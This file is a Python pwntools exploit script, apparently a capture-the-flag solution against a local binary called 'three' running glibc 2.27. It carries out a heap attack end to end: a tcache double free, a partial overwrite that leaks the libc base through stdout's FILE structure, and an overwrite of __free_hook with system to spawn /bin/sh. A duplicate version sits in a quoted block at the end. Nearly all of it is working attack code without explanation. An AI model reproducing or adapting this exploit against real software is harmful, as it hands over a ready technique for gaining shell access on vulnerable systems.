from pwn import *
import sys

context.arch = "amd64"
elf = ELF("./three")
status = sys.argv[1]

if status == 'l':
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elif status == 'd':
    libc = ELF("./libc.so.6")
else:
    info("INVALID STATUS")
    exit()

def choice(idx):
    io.sendlineafter("choice:",str(idx),timeout=0.5)
def addN(data):
    choice(1)
    io.sendafter("content:",data)
def editN(idx,data):
    choice(2)
    io.sendlineafter("idx:",str(idx))
    io.sendafter("content:",data)
def freeN(idx,c):
    choice(3)
    io.sendlineafter("idx:",str(idx))
    io.sendlineafter("(y/n):",c)

ff_fill = p64(0)*2+p64(0xfbad1c00)+p64(0)*3+'\x00'

while True:
    global io
    try:
        if status == 'l':
            io = process("./three")
        else:
            io = process("./three",env = {"LD_PRELOAD":"./libc.so.6"})
        #tcache -> fast -> unsorted -> free
        addN('aaaa')#0
        addN(p64(0)*7+p64(0x11))#1
        freeN(1,'y')#hp+0x2b0
        freeN(0,'n')#hp+0x260
        editN(0,'\x30')
        addN('cccc')#1
        addN(p64(0)*5+p64(0x91))#2
        for i in range(7):
            freeN(1,'n')
        #first put in tcache, then unsorted bin
        editN(2,p64(0)*5+p64(0x51))
        freeN(0,'n')
        freeN(0,'y')#double free to avoid negative count
        editN(2,p64(0)*5+p64(0x91))
        freeN(1,'y')
        info("this chunk in both tcahce and unsorted")
        editN(2,p64(0)*5+p64(0x51)+p16(0x7750))
        addN('dddd')#0 hp+0x260
        editN(2,p64(0)*5+p64(0x51)+p64(0)*2)
        addN(ff_fill)
        io.recv(8,timeout = 0.8)
        libc_base = u64(io.recv(6,timeout = 0.8).ljust(8,'\x00'))-0x3ed8b0 #libc.sym['_IO_stdfile_2_lock']
        success("LIBC BASE -> %#x"%libc_base)
        
        freeN(0,'y')
        editN(2,p64(0)*5+p64(0x51)+p64(libc_base+libc.sym['__free_hook']))
        addN('eeee')
        editN(2,p64(0)*5+p64(0x71)+p64(libc_base+libc.sym['__free_hook']))
        freeN(0,'y') # make more null space
        addN(p64(libc_base+libc.sym['system']))
        editN(2,"/bin/sh\x00")
        choice(3)
        io.sendlineafter("idx:",'2')
        
        io.interactive()
    except Exception,e:
        info(str(e))
        io.close()
        info("crash fail")
        continue
'''

def pwn():
    global io
    if status == 'l':
        io = process("./three")
    else:
        io = process("./three",env = {"LD_PRELOAD":"./libc.so.6"})
    #tcache -> fast -> unsorted -> free
    addN('aaaa')#0
    addN(p64(0)*7+p64(0x11))#1
    freeN(1,'y')#hp+0x2b0
    freeN(0,'n')#hp+0x260
    editN(0,'\x30')
    addN('cccc')#1
    addN(p64(0)*5+p64(0x91))#2
    for i in range(7):
        freeN(1,'n')
    #first put in tcache, then unsorted bin
    editN(2,p64(0)*5+p64(0x51))
    freeN(0,'n')
    freeN(0,'y')#double free to avoid counts == 0xff
    editN(2,p64(0)*5+p64(0x91))
    freeN(1,'y')
    info("this chunk in both tcahce and unsorted")
    
    editN(2,p64(0)*5+p64(0x51)+p16(0x7750))
    addN('dddd')#0 hp+0x260
    editN(2,p64(0)*5+p64(0x51)+p64(0)*2)
    addN(ff_fill)
    io.recv(8)
    libc_base = u64(io.recv(6).ljust(8,'\x00'))-0x3ed8b0#libc.sym['_IO_stdfile_2_lock']
    success("LIBC BASE -> %#x"%libc_base)
    freeN(0,'y')
    editN(2,p64(0)*5+p64(0x51)+p64(libc_base+libc.sym['__free_hook']))
    addN('eeee')
    editN(2,p64(0)*5+p64(0x71)+p64(libc_base+libc.sym['__free_hook']))
    freeN(0,'y')
    addN(p64(libc_base+libc.sym['system']))
    editN(2,"/bin/sh\x00")
    choice(3)
    io.sendlineafter("idx:",'2')
    io.interactive()
pwn()
'''
